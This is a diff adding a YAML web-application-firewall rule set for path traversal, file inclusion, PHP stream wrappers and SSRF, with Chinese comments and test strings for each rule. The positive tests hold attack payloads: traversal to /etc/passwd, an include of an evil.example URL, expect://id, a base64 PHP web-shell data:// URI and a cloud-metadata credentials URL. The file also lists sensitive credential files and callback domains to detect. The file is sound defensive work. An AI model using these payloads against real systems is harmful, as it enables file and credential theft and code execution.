@@ -1,0 +1,526 @@
+# 路径穿越 / 文件包含（LFI）与远程文件包含 / SSRF（RFI）
+#
+# 变换链按规则分，刻意不共用：
+#   - 7001/7004/7005/7006：urlDecode ×2（+ removeNulls）+ lowercase
+#     —— 解码后匹配：既接受原始明文，也接受一次/两次编码的形态。
+#   - 7002：只 lowercase
+#     —— 不解码，直接匹配 %2e%2e%2f / %252e%252e 这类"编码形态的字面量"，
+#        与解码后那条互为兜底（扫描器常按代数叠加编码）。
+#
+# **normalizePath 只有 7004 能挂**，这不是随手写的：
+#   - 7001（回溯语义）与 7002（编码字面量）要的证据就是 `../` 本身，
+#     规范化会把它解掉 —— 挂了等于把要检测的东西抹掉；
+#   - 7005（PHP 流包装器）要的是 `php://` 这个形态，而 normalizePath 会把
+#     `//` 折成 `/`（变成 `php:/`），挂了反而漏检；
+#   - 7004 匹配的是"目标文件"，等价写法必须折叠成同一形态才能拦全 ——
+#     `/etc//passwd`、`/etc/./passwd`、`/etc/x/../passwd`、`%2f` 编码斜杠
+#     都要回到 `/etc/passwd`。实测（DVWA 绝对路径包含）不挂时这些变体整条绕过。
+#
+# crackweb 会发 //etc/passwd、/.//etc/passwd 这类规范化变体 ——
+# 路径位置的变体由 parser 的路径规范化负责，参数值位置的变体由 7004 的
+# normalizePath 负责（此前只覆盖了前者，参数值那一半是盲区）。
+version: 1
+meta:
+  name: "路径穿越与文件包含"
+  author: "qingli"
+  category: lfi
+
+rules:
+
+  - id: LFI-7001
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "路径穿越特征：目录回溯语义命中（detectPathTraversal）"
+    tags: [lfi, owasp-a01, path-traversal, semantic]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_URI
+      - collection: REQUEST_PATH
+      - collection: FILES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - removeNulls
+      - lowercase
+    operator:
+      name: detectPathTraversal
+      # min_depth=2：至少两级回溯（或命中敏感文件/流包装器）才立案。
+      # 只要求一级会把 `?file=../templates/x.html` 这类正常相对路径打死
+      # （单级相对路径在业务里很常见，见 LFI-7002 的说明）。
+      params:
+        min_depth: 2
+    test:
+      positive:
+        - "../../../../etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "....//....//etc/passwd"
+      negative:
+        - "report-2024.pdf"
+        - "images/logo.png"
+        - "/var/www/html/index.html"
+
+  - id: LFI-7002
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "路径穿越特征：编码形态的回溯序列"
+    tags: [lfi, owasp-a01, path-traversal, encoding]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_URI
+      - collection: REQUEST_BODY
+      - collection: FILES
+    transforms:
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "../../"
+          - "..\\..\\"
+          - "..%2f"
+          - "..%5c"
+          - "%2e%2e%2f"
+          - "%2e%2e%5c"
+          - "%2e%2e/"
+          - ".%2e/"
+          - "%252e%252e"
+          - "..%252f"
+          - "....//"
+          - "..;/"
+          - "%c0%ae%c0%ae"
+          - "..%c0%af"
+          - "..%00/"
+          # 过长短 UTF-8（老 IIS/Java 解码器把 %c0%af 当 `/`）
+          - "%c0%ae"
+          - "%c0%af"
+          - "%c0%2e"
+          - "%c0%5c"
+          - "%c1%9c"
+          - "%e0%80%af"
+          - "%f0%80%80%af"
+    test:
+      positive:
+        - "%c0%afetc%c0%af%c0%ae%c0%afpasswd"
+        - "../../../etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2fetc/passwd"
+        - "....//....//etc/passwd"
+        - "..%252f..%252fetc%252fpasswd"
+        - "..\\..\\windows\\win.ini"
+      negative:
+        - "report-2024.pdf"
+        - "images/logo.png"
+        - "Catalogue .. 2024 edition"
+        - "the range is 1..10"
+
+  - id: LFI-7003
+    phase: 2
+    severity: high
+    category: lfi
+    score: 4
+    message: "文件包含特征：include/require 携带外部或穿越目标"
+    tags: [lfi, owasp-a03, file-inclusion]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '\b(?:include|require)(?:_once)?\s*\([^)]{0,16}(?:https?://|\$_(?:get|post|request|cookie|server)|\.\./|\.\.\\|/etc/|/proc/|php://|data://|expect://|phar://)'
+    test:
+      positive:
+        - "<?php include($_GET['page']); ?>"
+        - "<?php require_once('../../../etc/passwd'); ?>"
+        - "include(\"http://evil.example/x.txt\")"
+        - "<?php require($_REQUEST['f']); ?>"
+      negative:
+        - "please include your order number in the email"
+        - "the requirements are documented in the specification"
+        - "we include a PDF invoice with every shipment"
+
+  - id: LFI-7004
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "文件读取特征：敏感系统文件路径"
+    tags: [lfi, owasp-a01, sensitive-file]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_URI
+      - collection: REQUEST_PATH
+      - collection: REQUEST_BODY
+      - collection: REQUEST_COOKIES
+    # 这一条**必须**挂 normalizePath（与 7001/7002 正好相反）：
+    # 它匹配的是"目标文件"，所以要把等价写法折叠成同一个形态 ——
+    # `/etc//passwd`、`/etc/./passwd`、`/etc/x/../passwd`、`%2f` 编码斜杠，
+    # normalizePath 会折 `//`、去掉 `.` 段、解掉 `..` 段，全都回到 `/etc/passwd`。
+    # 实测（DVWA 绝对路径包含）：不挂之前这些变体整条绕过、读到 /etc/passwd。
+    # 顺序：两次 urlDecode 之后、lowercase 之前；normalizePath 内部还会再解一次
+    # 编码并截断 NUL，所以 removeNulls 只是兜底。
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizePath
+      - removeNulls
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "/etc/passwd"
+          - "/etc/shadow"
+          - "/etc/hosts"
+          - "/etc/group"
+          - "/etc/issue"
+          - "/etc/motd"
+          - "/etc/crontab"
+          - "/etc/fstab"
+          - "proc/self/environ"
+          - "proc/self/cmdline"
+          - "proc/self/cwd"
+          - "/proc/self/fd"
+          - "/proc/version"
+          - "win.ini"
+          - "windows/system32/config"
+          - "windows/repair/sam"
+          - "windows/system.ini"
+          - "boot.ini"
+          - "/root/.ssh"
+          - "/root/.bash_history"
+          - "/var/log/auth.log"
+          - "/var/log/apache"
+          - "/var/log/nginx"
+          - "web-inf/web.xml"
+          - "web-inf/classes"
+          - "meta-inf/application.xml"
+          - "/etc/httpd/conf"
+          - "/etc/nginx/nginx.conf"
+          - "/etc/my.cnf"
+          - "/etc/php.ini"
+    test:
+      positive:
+        - "../../../../etc/passwd"
+        - "%2fetc%2fpasswd"
+        - "C:\\Windows\\win.ini"
+        - "..%2f..%2fWEB-INF%2fweb.xml"
+        # 等价路径写法（实测都曾绕过）：双斜杠、点段、目录+回退、编码斜杠、大小写
+        - "/etc//passwd"
+        - "/etc/./passwd"
+        - "/etc/foo/../passwd"
+        - "%2fetc%2f%2fpasswd"
+        - "/ETC//Passwd"
+      negative:
+        - "docs/readme.md"
+        - "assets/img/logo.png"
+        - "/var/www/html/index.html"
+        - "please review the password policy"
+        # 归一化之后仍然不该误伤的：CDN 双斜杠、相对路径里的单点
+        - "//cdn.example.com/logo.png"
+        - "./assets/app.css"
+
+  - id: LFI-7005
+    phase: 2
+    severity: critical
+    category: lfi
+    score: 5
+    message: "文件包含特征：PHP 流包装器"
+    tags: [lfi, owasp-a03, php-wrapper]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "php://filter"
+          - "php://input"
+          - "php://fd"
+          - "php://memory"
+          - "php://temp"
+          - "php://stdin"
+          - "expect://"
+          - "phar://"
+          - "zip://"
+          - "compress.zlib://"
+          - "compress.bzip2://"
+          - "glob://"
+          - "data://text"
+          - "data://plain"
+          - "file:///etc"
+          - "file:///c:"
+          - "file:///proc"
+    test:
+      positive:
+        - "php://filter/convert.base64-encode/resource=index.php"
+        - "php://input"
+        - "expect://id"
+        - "phar://uploads/archive.phar/x"
+        - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+      negative:
+        - "https://example.com/index.php"
+        - "file downloads are available on the portal"
+        - "please zip the folder before sending"
+
+  - id: LFI-7006
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "路径穿越特征：回溯序列直接指向系统目录"
+    tags: [lfi, owasp-a01, path-traversal]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_COOKIES
+      - collection: REQUEST_URI
+    transforms:
+      - urlDecode
+      - urlDecode
+      - removeNulls
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "../etc/"
+          - "../proc/"
+          - "../root/"
+          - "../home/"
+          - "../var/"
+          - "../usr/"
+          - "../boot/"
+          - "../windows/"
+          - "../winnt/"
+          - "../sys/"
+          - "../dev/"
+          - "..\\etc\\"
+          - "..\\windows\\"
+          - "..\\winnt\\"
+          - "..\\boot\\"
+    test:
+      positive:
+        - "../../etc/passwd"
+        - "..\\..\\windows\\win.ini"
+        - "..%2f..%2fproc%2fself%2fenviron"
+      negative:
+        - "../docs/specification.pdf"
+        - "report-2024.pdf"
+        - "data/export.csv"
+
+  # 通配符混淆：shell 的 glob 会把 `?`/`*`/`[]` 展开成真实字符，
+  # `/etc/pass?d` 与 `/etc/passwd` 等价。类目里的 pm 字面量认不出这种形态，
+  # 所以单列一条正则规则（要求"路径/参数边界 + 被 glob 打断的敏感文件名"）。
+  #
+  # 只在两种形态上立案，避免打宽：
+  #   1. 文件名内部被 glob 打断：pass?d、sha*dow、id_rs?、authoriz?d_keys、win?ini、boot?ini
+  #   2. 目录被 glob 打断且后面紧跟敏感文件名：/e??/passwd、/e*/shadow
+  - id: LFI-7007
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "文件读取特征：通配符混淆的敏感文件路径"
+    tags: [lfi, owasp-a01, sensitive-file, glob]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_URI
+      - collection: REQUEST_PATH
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - removeNulls
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '(?:^|[/\s;|&\"''=])(?:pass[?*]{1,2}w?d|sha[?*]{1,2}dow|gr[?*]{1,2}up|id_rs[?*]{1,2}|authorize[?*]{1,2}d_keys|win[?*.]{1,2}ini|boot[?*.]{1,2}ini|[a-z?*\[]{0,10}[?*\[]{1,3}[a-z?*\[]{0,10}/[a-z?*\[]{0,20}(?:passwd|shadow|id_rsa))'
+    test:
+      positive:
+        - "; cat /etc/pass?d"
+        - "/etc/pass*d"
+        - "/etc/sha?dow"
+        - "/e??/passwd"
+        - "/root/.ssh/id_rs?"
+      negative:
+        - "/images/*.png"
+        - "/etc/nginx/*.conf"
+        - "a*b"
+        - "what? really"
+        - "/api/v1/items?page=2"
+
+  - id: RFI-8001
+    phase: 2
+    severity: critical
+    category: rfi
+    score: 5
+    message: "SSRF 特征：指向回环地址或云元数据端点"
+    tags: [rfi, ssrf, owasp-a10, cloud-metadata]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "http://127.0.0.1"
+          - "http://localhost"
+          - "http://0.0.0.0"
+          - "http://[::1]"
+          - "http://169.254.169.254"
+          - "metadata.google.internal"
+          - "http://100.100.100.200"
+          - "instance-data"
+          - "gopher://127.0.0.1"
+          - "dict://127.0.0.1"
+    test:
+      positive:
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://127.0.0.1:8080/admin"
+        - "http://metadata.google.internal/computeMetadata/v1/"
+      negative:
+        - "https://api.example.com/v1/items"
+        - "https://cdn.example.com/assets/logo.png"
+        - "the service is reachable over the public internet"
+
+  - id: RFI-8002
+    phase: 2
+    severity: medium
+    category: rfi
+    score: 3
+    message: "带外探测迹象：请求中出现已知 OOB 回调域名"
+    tags: [rfi, oob, blind-detection]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+    transforms:
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "burpcollaborator.net"
+          - "oastify.com"
+          - "oast.pro"
+          - "oast.live"
+          - "oast.site"
+          - "oast.online"
+          - "oast.fun"
+          - "oast.me"
+          - "interact.sh"
+          - "dnslog.cn"
+          - "ceye.io"
+          - "requestbin.net"
+          - "requestbin.com"
+          - "pipedream.net"
+          - "webhook.site"
+          - "canarytokens.com"
+    action:
+      type: log
+    test:
+      positive:
+        - "http://abc123.oastify.com/x"
+        - "x9.burpcollaborator.net"
+        - "http://dnslog.cn/abc123"
+      negative:
+        - "https://example.com/callback"
+        - "https://hooks.example.com/webhook"
+        - "the callback endpoint is documented in the API guide"
+
+  # 私网地址段单列一条、给低分：内部工具（图片代理、webhook 配置、健康巡检）
+  # 合法地传 10.x / 192.168.x 是常见业务形态，不能和云元数据端点同分。
+  - id: RFI-8003
+    phase: 2
+    severity: medium
+    category: rfi
+    score: 3
+    message: "SSRF 迹象：请求中出现私网地址或本地文件协议"
+    tags: [rfi, ssrf, owasp-a10, private-network]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "http://10."
+          - "http://192.168."
+          - "http://172.16."
+          - "http://172.17."
+          - "http://172.18."
+          - "http://172.19."
+          - "http://172.2"
+          - "http://172.30."
+          - "http://172.31."
+          - "file:///c:/windows"
+          - "file:///c:/users"
+          - "http://[0:0:0:0:0:ffff:127.0.0.1]"
+    action:
+      type: log
+    test:
+      positive:
+        - "http://192.168.1.1/status"
+        - "http://10.20.30.40:8080/actuator/health"
+        - "http://172.16.5.9/admin"
+      negative:
+        - "https://api.example.com/v1/items"
+        - "https://cdn.example.com/assets/logo.png"
+        - "the internal wiki is at https://wiki.corp.example"
+
+  - id: LFI-7008
+    phase: 2
+    severity: high
+    category: lfi
+    score: 5
+    message: "路径包含特征：只可能是读取目标的系统文件（主机名/口令/计划任务/内核信息）"
+    tags: [lfi, owasp-a03, sensitive-file]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+      - collection: REQUEST_COOKIES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: "/(?:etc/(?:hostname|hosts|issue|mtab|crontab|shadow|gshadow|sudoers)|proc/(?:version|cmdline|self/(?:environ|cmdline|root))|root/\\.ssh|var/log/(?:auth|secure|messages))"
+    test:
+      positive:
+        - "/etc/hostname"
+        - "/etc/crontab"
+        - "/etc/hosts"
+        - "/proc/version"
+        - "/proc/self/environ"
+        - "/root/.ssh/id_rsa"
+        - "/var/log/auth.log"
+      negative:
+        - "/var/www/html/index.php"
+        - "/var/www/html/robots.txt"
+        - "/static/css/app.css"
+        - "hostname=web-01"
